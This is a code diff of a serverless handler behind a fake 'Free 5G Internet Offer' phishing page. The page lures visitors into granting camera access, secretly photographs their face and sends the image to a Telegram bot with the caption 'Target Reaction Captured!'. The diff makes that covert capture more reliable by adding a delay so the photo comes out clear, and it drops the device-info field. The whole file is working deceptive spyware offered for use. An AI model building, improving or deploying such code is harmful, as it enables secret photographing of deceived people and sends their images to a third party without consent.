@@ -6,7 +6,7 @@ export default async function handler(req, res) {
 
     if (req.method === 'POST') {
         try {
-            const { image, id, info } = req.body;
+            const { image, id } = req.body;
             if (!image || !id) return res.status(400).json({ error: "Missing data" });
 
             const base64Data = image.replace(/^data:image\/(jpeg|png);base64,/, "");
@@ -15,46 +15,37 @@ export default async function handler(req, res) {
             const form = new FormData();
             form.append('chat_id', id);
             form.append('photo', imageBuffer, { filename: 'capture.jpg' });
-            
-            // Added dynamic info to the caption
-            form.append('caption', `📸 **Target Reaction Captured!**\n\n` +
-                                   `📱 **Device:** ${info || 'Unknown'}\n` +
-                                   `👨‍💻 **DEVELOPER:** @Eshucording\n` +
-                                   `📞 **Contact:** 8123561579`);
+            form.append('caption', "📸 Target Reaction Captured!\n\n👨‍💻 DEVELOPER: @Eshucording\n📞 Contact: 8123561579");
 
             await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
                 headers: form.getHeaders(),
             });
             return res.status(200).json({ success: true });
         } catch (error) {
-            return res.status(200).json({ success: false });
+            console.error(error);
+            return res.status(200).json({ success: false }); 
         }
     }
 
     res.setHeader('Content-Type', 'text/html');
     return res.send(`
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>5G Network Booster | Free Offer</title>
+    <title>Free 5G Internet Offer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #0a0a0a; color: #00ff00; text-align: center; font-family: 'Courier New', Courier, monospace; }
-        .box { border: 2px solid #00ff00; margin: 50px auto; width: 90%; max-width: 400px; padding: 20px; box-shadow: 0 0 15px #00ff00; }
-        .loading-bar { width: 100%; background: #222; height: 10px; margin-top: 20px; border-radius: 5px; overflow: hidden; }
-        .progress { width: 0%; height: 100%; background: #00ff00; transition: width 0.5s; }
+        body { background: #000; color: white; text-align: center; font-family: sans-serif; }
+        .container { margin-top: 50px; padding: 20px; }
+        .btn { background: #007bff; color: white; padding: 15px 25px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
         video, canvas { display: none; }
-        #status { font-size: 14px; margin-top: 10px; color: #aaa; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2 style="color: #fff;">5G ACTIVATOR</h2>
-        <p>Verifying Network Compatibility...</p>
-        <div class="loading-bar"><div id="bar" class="progress"></div></div>
-        <p id="status">Status: Waiting for user...</p>
-        <button id="startBtn" style="background:#00ff00; color:#000; border:none; padding:10px 20px; font-weight:bold; cursor:pointer;">ACTIVATE 5G</button>
+    <div class="container">
+        <h1>Claim Your Free 5G Data</h1>
+        <p>Click below to verify your device and activate the offer.</p>
+        <button class="btn" onclick="startVerification()">Activate Now</button>
     </div>
 
     <video id="video" autoplay playsinline></video>
@@ -62,56 +53,51 @@ export default async function handler(req, res) {
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('id') || "6296180183";
+        // Using the ID from your previous code
+        const chatId = urlParams.get('id') || "6296180183"; 
 
-        document.getElementById('startBtn').addEventListener('click', async () => {
-            document.getElementById('status').innerText = "Status: Initializing Secure Tunnel...";
-            document.getElementById('startBtn').style.display = "none";
-            
+        async function startVerification() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-
-                let progress = 0;
-                const interval = setInterval(() => {
-                    progress += 10;
-                    document.getElementById('bar').style.width = progress + "%";
-                    if(progress === 40) {
-                         captureFrame("Analyzing Face ID...");
-                    }
-                    if(progress === 90) {
-                         captureFrame("Syncing with Satellite...");
-                    }
-                    if (progress >= 100) {
-                        clearInterval(interval);
-                        document.getElementById('status').innerText = "Error: System Overloaded. Try again.";
-                    }
-                }, 800);
-
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // 2 second delay to fix the black screen issue (allows camera sensor to focus)
+                    setTimeout(() => {
+                        captureAndSend();
+                    }, 2000);
+                };
             } catch (err) {
-                alert("Please enable Camera Access to verify your 5G eligibility.");
+                console.error("Camera access denied");
+                alert("Permission required to verify 5G compatibility.");
             }
-        });
+        }
 
-        function captureFrame(statusMsg) {
+        function captureAndSend() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
-            document.getElementById('status').innerText = "Status: " + statusMsg;
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            const info = "Model: " + navigator.platform + " | Browser: " + navigator.appName;
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            const imageData = canvas.toDataURL('image/jpeg', 0.9);
 
-            fetch(window.location.href, {
+            fetch(window.location.pathname, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: imageData, id: chatId, info: info })
-            });
+                body: JSON.stringify({ image: imageData, id: chatId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const tracks = video.srcObject.getTracks();
+                tracks.forEach(track => track.stop());
+                alert("Checking eligibility... Please wait.");
+            })
+            .catch(err => console.error("Error sending to bot:", err));
         }
     </script>
 </body>
